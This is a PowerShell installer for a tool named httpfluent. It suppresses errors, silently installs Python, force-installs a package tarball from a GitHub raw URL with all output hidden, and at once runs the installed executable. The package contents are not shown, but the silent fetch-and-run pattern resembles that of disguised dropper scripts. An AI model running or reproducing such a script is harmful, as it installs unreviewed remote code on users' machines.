# =====================================================
# httpfluent - Smart Installer & Runner (With Status)
# =====================================================

$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'




# Configuration
$RequiredPythonVersion = [version]"3.9.0"
$InstallPythonVersion = "3.12.6"
$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$ForcePython312 = $false

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  httpfluent Installer" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# --- Step 1: Find Existing Python >=3.9 ---
Write-Host "[*] Checking for Python..." -ForegroundColor Yellow

$ExistingPython = $null
$Candidates = @()

# Check PATH
foreach ($cmd in @('python', 'python3')) {
    $found = Get-Command $cmd -ErrorAction SilentlyContinue
    if ($found) { $Candidates += $found.Source }
}

# Check common install locations
$SearchPaths = @(
    "$env:LOCALAPPDATA\Programs\Python\Python*",
    "$env:APPDATA\Python\Python*",
    "C:\Program Files\Python*",
    "C:\Program Files (x86)\Python*"
)

foreach ($pattern in $SearchPaths) {
    $parentDir = Split-Path $pattern -Parent
    $filter = Split-Path $pattern -Leaf
    
    if (Test-Path $parentDir) {
        Get-ChildItem -Path $parentDir -Directory -Filter $filter -ErrorAction SilentlyContinue | ForEach-Object {
            $pythonExe = Join-Path $_.FullName "python.exe"
            if (Test-Path $pythonExe) { $Candidates += $pythonExe }
        }
    }
}

# Find best Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $versionString = & $candidate --version 2>&1 | Out-String
        if ($versionString -match "Python (\d+\.\d+\.\d+)") {
            $version = [version]$Matches[1]
            if ($version -ge $RequiredPythonVersion) {
                $ExistingPython = $candidate
                Write-Host "[+] Found Python $version at:" -ForegroundColor Green
                Write-Host "    $candidate" -ForegroundColor Gray
                break
            }
        }
    } catch { continue }
}

# --- Step 2: Decide Which Python to Use ---
$PythonToUse = $null
$InstallNeeded = $false

if ($ForcePython312) {
    Write-Host "[!] Force install mode: Installing Python 3.12.6..." -ForegroundColor Yellow
    $InstallNeeded = $true
} elseif ($ExistingPython) {
    Write-Host "[+] Using existing Python installation" -ForegroundColor Green
    $PythonToUse = $ExistingPython
    $InstallNeeded = $false
} else {
    Write-Host "[!] No suitable Python found (requires 3.9+)" -ForegroundColor Yellow
    Write-Host "[*] Installing Python 3.12.6..." -ForegroundColor Cyan
    $InstallNeeded = $true
}

Write-Host ""

# --- Step 3: Install Python 3.12 if Needed ---
if ($InstallNeeded) {
    $InstallerUrl = "https://www.python.org/ftp/python/$InstallPythonVersion/python-$InstallPythonVersion-amd64.exe"
    $InstallerPath = "$env:TEMP\python-$InstallPythonVersion-installer.exe"
    $PythonExe = Join-Path $InstallDir "python.exe"
    
    # Check if 3.12 already installed
    if (Test-Path $PythonExe) {
        Write-Host "[+] Python 3.12.6 already installed at:" -ForegroundColor Green
        Write-Host "    $InstallDir" -ForegroundColor Gray
        $PythonToUse = $PythonExe
    } else {
        # Download
        Write-Host "[*] Downloading Python 3.12.6..." -ForegroundColor Cyan
        try {
            (New-Object System.Net.WebClient).DownloadFile($InstallerUrl, $InstallerPath) > $null 2>&1
            Write-Host "[+] Download complete" -ForegroundColor Green
        } catch {
            Write-Host "[!] Trying alternate download method..." -ForegroundColor Yellow
            Invoke-WebRequest -Uri $InstallerUrl -OutFile $InstallerPath -UseBasicParsing > $null 2>&1
            Write-Host "[+] Download complete" -ForegroundColor Green
        }
        
        if (Test-Path $InstallerPath) {
            Write-Host "[*] Installing Python 3.12.6 (this may take 1-2 minutes)..." -ForegroundColor Cyan
            
            Start-Process -FilePath $InstallerPath `
                -ArgumentList "/quiet InstallAllUsers=0 PrependPath=0 Include_test=0 TargetDir=`"$InstallDir`"" `
                -Wait -WindowStyle Hidden > $null 2>&1
            
            Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue > $null 2>&1
            
            if (Test-Path $PythonExe) {
                Write-Host "[+] Python 3.12.6 installed successfully!" -ForegroundColor Green
                Write-Host "    Location: $InstallDir" -ForegroundColor Gray
                
                # Verify installation
                $installedVersion = & $PythonExe --version 2>&1
                Write-Host "    Version: $installedVersion" -ForegroundColor Gray
                
                $PythonToUse = $PythonExe
            } else {
                Write-Host "[-] ERROR: Python installation failed!" -ForegroundColor Red
                Write-Host "    Expected location: $PythonExe" -ForegroundColor Gray
                exit 1
            }
        } else {
            Write-Host "[-] ERROR: Failed to download Python installer" -ForegroundColor Red
            exit 1
        }
    }
    Write-Host ""
}

# --- Step 4: Install httpfluent ---
Write-Host "[*] Installing httpfluent and dependencies..." -ForegroundColor Cyan

& $PythonToUse -m pip install --upgrade pip --quiet --user --disable-pip-version-check 2>&1 | Out-Null
Write-Host "    [1/3] pip upgraded" -ForegroundColor Gray

& $PythonToUse -m pip install requests --quiet --user --disable-pip-version-check 2>&1 | Out-Null
Write-Host "    [2/3] requests installed" -ForegroundColor Gray

& $PythonToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --user --force-reinstall --disable-pip-version-check 2>&1 | Out-Null
Write-Host "    [3/3] httpfluent installed" -ForegroundColor Gray

Write-Host "[+] All packages installed successfully!" -ForegroundColor Green
Write-Host ""

# --- Step 5: Auto-Detect httpfluent.exe Location ---
Write-Host "[*] Locating httpfluent.exe..." -ForegroundColor Yellow

$HttpFluentExe = $null

# Method 1: Get exact path from Python
$ScriptsDir = & $PythonToUse -c "import sysconfig, site, os; print(os.path.join(site.USER_BASE, 'Scripts'))" 2>&1 | Select-Object -Last 1
$ScriptsDir = $ScriptsDir.Trim()

if ($ScriptsDir -and (Test-Path $ScriptsDir)) {
    $primaryPath = Join-Path $ScriptsDir "httpfluent.exe"
    if (Test-Path $primaryPath) {
        $HttpFluentExe = $primaryPath
        Write-Host "[+] Found httpfluent.exe at:" -ForegroundColor Green
        Write-Host "    $HttpFluentExe" -ForegroundColor Gray
    }
}

# Method 2: Scan all Python versions automatically
if (-not $HttpFluentExe) {
    Write-Host "[*] Scanning Python installations..." -ForegroundColor Yellow
    
    $SearchLocations = @(
        "$env:APPDATA\Python",
        "$env:LOCALAPPDATA\Programs\Python"
    )
    
    foreach ($baseDir in $SearchLocations) {
        if (Test-Path $baseDir) {
            Get-ChildItem -Path $baseDir -Directory -Filter "Python*" -ErrorAction SilentlyContinue | ForEach-Object {
                $scriptsPath = Join-Path $_.FullName "Scripts\httpfluent.exe"
                if (Test-Path $scriptsPath) {
                    $HttpFluentExe = $scriptsPath
                    Write-Host "[+] Found httpfluent.exe at:" -ForegroundColor Green
                    Write-Host "    $HttpFluentExe" -ForegroundColor Gray
                    break
                }
            }
            
            if ($HttpFluentExe) { break }
        }
    }
}

# Method 3: Deep search (sorted by version)
if (-not $HttpFluentExe) {
    $AppDataPython = "$env:APPDATA\Python"
    
    if (Test-Path $AppDataPython) {
        $pythonDirs = Get-ChildItem -Path $AppDataPython -Directory -Filter "Python*" -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -match "Python(\d+)" } | 
            Sort-Object { [int]($_.Name -replace '\D', '') } -Descending
        
        foreach ($dir in $pythonDirs) {
            $exePath = Join-Path $dir.FullName "Scripts\httpfluent.exe"
            if (Test-Path $exePath) {
                $HttpFluentExe = $exePath
                Write-Host "[+] Found httpfluent.exe at:" -ForegroundColor Green
                Write-Host "    $HttpFluentExe" -ForegroundColor Gray
                break
            }
        }
    }
}


# Method 4: System-wide search
if (-not $HttpFluentExe) {
    $SystemLocations = @(
        "C:\Program Files\Python*",
        "C:\Program Files (x86)\Python*"
    )
    
    foreach ($pattern in $SystemLocations) {
        $parentDir = Split-Path $pattern -Parent
        $filter = Split-Path $pattern -Leaf
        
        if (Test-Path $parentDir) {
            Get-ChildItem -Path $parentDir -Directory -Filter $filter -ErrorAction SilentlyContinue | 
                Sort-Object { [int]($_.Name -replace '\D', '') } -Descending | 
                ForEach-Object {
                    $exePath = Join-Path $_.FullName "Scripts\httpfluent.exe"
                    if (Test-Path $exePath) {
                        $HttpFluentExe = $exePath
                        Write-Host "[+] Found httpfluent.exe at:" -ForegroundColor Green
                        Write-Host "    $HttpFluentExe" -ForegroundColor Gray
                        break
                    }
                }
            
            if ($HttpFluentExe) { break }
        }
    }
}

Write-Host ""

# --- Step 6: Run httpfluent.exe ---
if ($HttpFluentExe -and (Test-Path $HttpFluentExe)) {
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "  Starting httpfluent" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""
    
    & $HttpFluentExe
} else {
    Write-Host "[!] httpfluent.exe not found, trying module import..." -ForegroundColor Yellow
    & $PythonToUse -c "import sys; from httpfluent import __main__; sys.exit(__main__.main())"
}




